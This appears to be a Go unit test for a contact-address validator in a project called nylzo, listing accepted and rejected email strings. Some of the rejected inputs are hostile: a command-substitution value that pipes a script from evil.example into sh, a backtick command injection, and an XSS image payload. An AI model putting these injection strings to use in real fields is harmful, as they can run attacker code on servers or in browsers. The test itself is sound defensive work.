package report_test

import (
	"errors"
	"strings"
	"testing"

	"github.com/misaon/nylzo/internal/core"
	"github.com/misaon/nylzo/internal/core/report"
)

func TestParseContactKeepsPlausibleAddressesAndRefusesLinks(t *testing.T) {
	t.Parallel()
	link := core.FormatLink("https://nylzo.example", core.NewID(), core.KDFNone, core.NewSecret(), core.NewSecret())
	for raw, want := range map[string]string{
		"":                                 "",
		" \t\n":                            "",
		"  jana@example.cz\n":              "jana@example.cz",
		"jana.novakova+abuse@mail.example": "jana.novakova+abuse@mail.example",
		"jiri@xn--hek-0na27a.example":      "jiri@xn--hek-0na27a.example",
		strings.Repeat("a.", 120) + "b@example.cz": strings.Repeat("a.", 120) + "b@example.cz",
	} {
		if got, err := report.ParseContact(raw); err != nil || got != want {
			t.Errorf("ParseContact(%q) = %q, %v, want %q", raw, got, err, want)
		}
	}
	for _, raw := range []string{
		"jana",
		"@example.cz",
		"jana@",
		"jana@example",
		"jana@.example.cz",
		"jana@example..cz",
		"jana@example.cz.",
		"jana@@example.cz",
		"jana@example@cz.example",
		"ja na@example.cz",
		"jana\xc2\xa0@example.cz",
		"ja\x1bna@example.cz",
		"ja\xe2\x80\xaena@example.cz",
		"jana#1@example.cz",
		"jana@example.cz/m/x",
		"jana@exa_mple.cz",
		"ja\xffna@example.cz",
		strings.Repeat("a.", 122) + "b@example.cz",
		"o'brien@mail.example",
		"jiří@háček.example",
		"abuse@exаmple.com",
		"$(curl${IFS}-s${IFS}evil.example|sh)@example.com",
		"<img/src=x/onerror=alert(1)>@example.com",
		"PHWPLfc5h_ttYhLwBUZM_r6y4UiSFMC54lqQJKLHYYE@example.com",
		"a`id`b@example.com",
		link,
		link + "@example.cz",
		"jana@example.cz " + link,
	} {
		if got, err := report.ParseContact(raw); !errors.Is(err, report.ErrContact) {
			t.Errorf("ParseContact(%q) = %q, %v, want ErrContact", raw, got, err)
		}
	}
}
